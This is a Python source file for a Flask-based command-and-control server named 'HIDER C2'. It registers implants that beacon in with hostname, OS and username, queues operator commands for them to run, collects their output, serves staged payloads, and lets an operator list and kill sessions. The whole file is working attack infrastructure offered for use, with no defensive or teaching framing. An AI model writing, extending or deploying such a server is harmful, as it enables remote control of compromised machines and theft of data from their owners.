"""
c2/server.py — C2 HTTP(S) Listener

Flask-based C2 server that handles implant beacons, command queuing,
result collection, and payload staging.

Routes:
  GET  /beacon           — Implant check-in (returns queued command or NOP)
  POST /result           — Implant posts command output
  GET  /stage/<recipe>   — Serve staged payloads
  GET  /c2/sessions      — Operator: list sessions (API)
  POST /c2/command       — Operator: queue a command (API)
  GET  /c2/results/<id>  — Operator: get results for a session (API)
"""
import os
import sys
import json
from flask import Flask, request, jsonify

# Add parent dir to path so we can import c2.session
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from c2 import session

app = Flask(__name__)


# ─── Implant-Facing Routes ───────────────────────────────────────────

@app.route('/beacon', methods=['GET'])
def beacon():
    """
    Implant check-in.
    Query params: id, hostname, os, user
    First call (no id) → registers new session and returns the UUID.
    Subsequent calls → heartbeat + return pending command or NOP.
    """
    session_id = request.args.get('id')
    hostname = request.args.get('hostname', 'unknown')
    os_info = request.args.get('os', 'unknown')
    username = request.args.get('user', 'unknown')
    ip = request.remote_addr

    if not session_id:
        # New implant — register
        new_id = session.register(hostname, os_info, username, ip)
        print(f"\n[+] New session: {new_id} ({username}@{hostname} [{os_info}] from {ip})")
        return jsonify({"id": new_id, "cmd": "NOP"})

    # Existing implant — heartbeat
    session.heartbeat(session_id, ip)

    # Check for pending command
    pending = session.get_pending(session_id)
    if pending:
        print(f"[>] Sending command to {session_id}: {pending['command'][:60]}...")
        return jsonify({
            "id": session_id,
            "cmd": pending['command'],
            "cmd_id": pending['id']
        })

    return jsonify({"id": session_id, "cmd": "NOP"})


@app.route('/result', methods=['POST'])
def result():
    """
    Implant posts command result.
    JSON body: {"cmd_id": int, "output": str}
    """
    data = request.get_json(force=True, silent=True) or {}
    cmd_id = data.get('cmd_id')
    output = data.get('output', '')

    if cmd_id:
        session.store_result(cmd_id, output)
        print(f"[<] Result received for command #{cmd_id} ({len(output)} bytes)")
        return jsonify({"status": "ok"})

    return jsonify({"status": "error", "msg": "missing cmd_id"}), 400


@app.route('/stage/<recipe_id>', methods=['GET'])
def stage(recipe_id):
    """Serve a staged payload file."""
    stage_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stages")
    filepath = os.path.join(stage_dir, recipe_id)
    if os.path.isfile(filepath):
        with open(filepath, 'r') as f:
            return f.read(), 200, {'Content-Type': 'text/plain'}
    return "Not Found", 404


# ─── Operator-Facing API Routes ──────────────────────────────────────

@app.route('/c2/sessions', methods=['GET'])
def api_sessions():
    """List all sessions."""
    sessions = session.list_sessions()
    return jsonify(sessions)


@app.route('/c2/command', methods=['POST'])
def api_command():
    """Queue a command for a session."""
    data = request.get_json(force=True, silent=True) or {}
    sid = data.get('session_id')
    cmd = data.get('command')
    if not sid or not cmd:
        return jsonify({"error": "session_id and command required"}), 400
    session.queue_command(sid, cmd)
    return jsonify({"status": "queued", "session_id": sid})


@app.route('/c2/results/<session_id>', methods=['GET'])
def api_results(session_id):
    """Get results for a session."""
    results = session.get_results(session_id)
    return jsonify(results)


@app.route('/c2/kill/<session_id>', methods=['POST'])
def api_kill(session_id):
    """Kill a session."""
    session.kill_session(session_id)
    return jsonify({"status": "killed", "session_id": session_id})


# ─── Entry Point ─────────────────────────────────────────────────────

def start_c2(host='0.0.0.0', port=8443, debug=False):
    """Start the C2 listener."""
    print(f"""
╔══════════════════════════════════════════╗
║       HIDER C2 — Command & Control       ║
╠══════════════════════════════════════════╣
║  Listener:  http://{host}:{port}        ║
║  Beacon:    GET  /beacon                 ║
║  Results:   POST /result                 ║
║  Staging:   GET  /stage/<id>             ║
╚══════════════════════════════════════════╝
    """)
    app.run(host=host, port=port, debug=debug)


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="Hider C2 Server")
    parser.add_argument('--host', default='0.0.0.0')
    parser.add_argument('--port', type=int, default=8443)
    parser.add_argument('--debug', action='store_true')
    args = parser.parse_args()
    start_c2(args.host, args.port, args.debug)
